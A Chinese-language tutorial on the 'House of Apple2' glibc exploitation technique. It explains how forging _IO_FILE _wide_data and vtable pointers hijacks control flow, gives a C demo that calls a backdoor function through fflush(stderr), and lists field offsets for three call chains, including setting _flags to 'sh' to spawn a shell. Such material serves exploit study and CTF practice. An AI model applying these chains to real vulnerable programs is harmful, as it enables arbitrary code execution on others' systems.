# House of Apple2


## 0xff 背景

`house of apple1`总得来说就是通过`_IO_FILE->_wide_data`来实现一次任意地址写堆地址的效果。等价于一次`largebin attack`

而`house of appl2`便是通过劫持`_wide_data`来控制程序执行流


## 0x00 利用条件

1. 已知`heap`地址和`glibc`地址
2. 能控制程序执行`IO`操作，例如\*从`main`函数返回，调用`exit`函数，触发`__malloc_assert`\*
3. 能够控制`_IO_FILE`的`vtable`和`_wide_data`，也可以认为是可以有`largebin attack`机会。或者说，可以任意地址写一个堆地址


## 0x01 原理

在`glibc2.23`中，可以通过劫持`vtable`从而替换其中的函数指针来控制程序的执行流

但在`glibc2.23`之后的版本中增加了对`vtable`的合法性检查，判断`vtable`地址是否在一个合法区间内。不过如果将`_IO_jump_t`改成`_IO_wfile_jumps`依然可以通过检查，从而实现跳转

`_IO_wfile_jumps`结构体：


```

const

struct

_IO_jump_t

_IO_wfile_jumps

libio_vtable

=

{


JUMP_INIT_DUMMY
,


JUMP_INIT
(
finish
,

_IO_new_file_finish
),


JUMP_INIT
(
overflow
,

(
_IO_overflow_t
)

_IO_wfile_overflow
),


JUMP_INIT
(
underflow
,

(
_IO_underflow_t
)

_IO_wfile_underflow
),


JUMP_INIT
(
uflow
,

(
_IO_underflow_t
)

_IO_wdefault_uflow
),


JUMP_INIT
(
pbackfail
,

(
_IO_pbackfail_t
)

_IO_wdefault_pbackfail
),


JUMP_INIT
(
xsputn
,

_IO_wfile_xsputn
),


JUMP_INIT
(
xsgetn
,

_IO_file_xsgetn
),


JUMP_INIT
(
seekoff
,

_IO_wfile_seekoff
),


JUMP_INIT
(
seekpos
,

_IO_default_seekpos
),


JUMP_INIT
(
setbuf
,

_IO_new_file_setbuf
),


JUMP_INIT
(
sync
,

(
_IO_sync_t
)

_IO_wfile_sync
),


JUMP_INIT
(
doallocate
,

_IO_wfile_doallocate
),


JUMP_INIT
(
read
,

_IO_file_read
),


JUMP_INIT
(
write
,

_IO_new_file_write
),


JUMP_INIT
(
seek
,

_IO_file_seek
),


JUMP_INIT
(
close
,

_IO_file_close
),


JUMP_INIT
(
stat
,

_IO_file_stat
),


JUMP_INIT
(
showmanyc
,

_IO_default_showmanyc
),


JUMP_INIT
(
imbue
,

_IO_default_imbue
)

};

libc_hidden_data_def

(
_IO_wfile_jumps
)

```

此时如果将`vtable`中的`_IO_jump_t`结构体地址改成`_IO_wfile_jump`，那么本应调用`__overflow`的函数不会执行，而是去调用`_IO_wfile_jumps`中的`_IO_wfile_overflow`函数

我们可以劫持`IO_FILE`的`vtable`为`_IO_wfile_jumps`，控制`_wide_data`为可控的堆地址空间，进而控制`_wide_data->_wide_vtable`为可控的堆地址空间。控制程序执行`IO`流函数调用，最终调用到`_IO_Wxxx`函数即可控制程序的执行流


### demo


```

#include
<stdio.h>

#include
<stdlib.h>

#include
<stdint.h>

#include
<unistd.h>

#include

<string.h>

void

backdoor
()

{


printf
(
"
\033
[31m[!] Backdoor is called!
\n
"
);


_exit
(
0
);

}

void

main
()

{


setbuf
(
stdout
,

0
);


setbuf
(
stdin
,

0
);


setbuf
(
stderr
,

0
);


char

*
p1

=

calloc
(
0x200
,

1
);


char

*
p2

=

calloc
(
0x200
,

1
);


puts
(
"[*] allocate two 0x200 chunks"
);


size_t

puts_addr

=

(
size_t
)
&
puts
;


printf
(
"[*] puts address: %p
\n
"
,

(
void

*
)
puts_addr
);


size_t

libc_base_addr

=

puts_addr

-

0x84420
;


printf
(
"[*] libc base address: %p
\n
"
,

(
void

*
)
libc_base_addr
);


size_t

_IO_2_1_stderr_addr

=

libc_base_addr

+

0x1ed5c0
;


printf
(
"[*] _IO_2_1_stderr_ address: %p
\n
"
,

(
void

*
)
_IO_2_1_stderr_addr
);


size_t

_IO_wstrn_jumps_addr

=

libc_base_addr

+

0x1e8c60
;


printf
(
"[*] _IO_wstrn_jumps address: %p
\n
"
,

(
void

*
)
_IO_wstrn_jumps_addr
);


char

*
stderr2

=

(
char

*
)
_IO_2_1_stderr_addr
;


puts
(
"[+] step 1: change stderr->_flags to 0x800"
);


*
(
size_t

*
)
stderr2

=

0x800
;


puts
(
"[+] step 2: change stderr->_mode to 1"
);


*
(
size_t

*
)(
stderr2

+

0xc0
)

=

1
;


puts
(
"[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20"
);


*
(
size_t

*
)(
stderr2

+

0xd8
)

=

_IO_wstrn_jumps_addr
-0x20
;


puts
(
"[+] step 4: replace stderr->_wide_data with the allocated chunk p1"
);


*
(
size_t

*
)(
stderr2

+

0xa0
)

=

(
size_t
)
p1
;


puts
(
"[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2"
);


*
(
size_t

*
)(
p1

+

0xe0
)

=

(
size_t
)
p2
;


puts
(
"[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base"
);


*
(
size_t

*
)(
p1

+

0x20
)

=

(
size_t
)
1
;


puts
(
"[+] step 7: put backdoor at fake _wide_vtable->_overflow"
);


*
(
size_t

*
)(
p2

+

0x18
)

=

(
size_t
)(
&
backdoor
);


puts
(
"[+] step 8: call fflush(stderr) to trigger backdoor func"
);


fflush
(
stderr
);

}

```

以上 demo 为通过`_IO_wdefault_xsgetn`函数实现后门函数的调用


## 0x02 利用思路

目前glibc源码中搜索到的`_IO_Wxxxx`系列函数的调用只有 `_IO_WSETBUF`、`_IO_WUNDERFLOW`、`_IO_WDOALLOCATE`和`_IO_WOVERFLOW`


### 利用\_IO\_wfile\_overflow函数控制程序执行流

对\_IO\_FILE结构体变量设置如下
- `_flags`设置为`~(2|0x8|0x800)`
- 如果不需要控制rdi，直接设置为0
- 如果需要获得shell，可设置为`sh`
- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`
- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`
调用链


```

_IO_wfile_overflow


_IO_wdoallocbuf


_IO_WDOALLOCATE


*
(
fp
->
_wide_data
->
_wide_vtable
+
0x68
)(
fp
)

```


### 利用`_IO_wfile_underflow_mmap`函数控制程序执行流

对`fp`的设置如下：
- `_flags`设置为`~4`，
- 如果不需要控制`rdi`，设置为`0`即可；
- 如果需要获得`shell`，可设置为 `sh;`，注意前面有个空格
- `vtable`设置为`_IO_wfile_jumps_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_underflow_mmap`即可
- `_IO_read_ptr < _IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`
- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
- `_wide_data->_IO_save_base`设置为`0`或者合法的可被`free`的地址，即满足`*(A + 0x40) = 0`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`
调用链


```

_IO_wfile_underflow_mmap


_IO_wdoallocbuf


_IO_WDOALLOCATE


*
(
fp
->
_wide_data
->
_wide_vtable

+

0x68
)(
fp
)

```


### 利用`_IO_wdefault_xsgetn`函数控制程序执行流

\*\*这条链执行的条件是调用到\_IO\_wdefault\_xsgetn时rdx寄存器，也就是第三个参数不为0\*\*如果不满足这个条件，可选用其他链。
对`fp`的设置如下：
- `_flags`设置为`0x800`
- `vtable`设置为`_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps`地址（加减偏移），使其能成功调用`_IO_wdefault_xsgetn`即可
- `_mode`设置为大于`0`，即满足`*(fp + 0xc0) > 0`
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_read_end == _wide_data->_IO_read_ptr`设置为`0`，即满足`*(A + 8) = *A`
- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`，即满足`*(A + 0x20) > *(A + 0x18)`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->overflow`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x18) = C`
函数的调用链如下：


```

_IO_wdefault_xsgetn

    
__wunderflow

        
_IO_switch_to_wget_mode

            
_IO_WOVERFLOW

                
*
(
fp
->
_wide_data
->
_wide_vtable
+
0x18
)(
fp
)

```
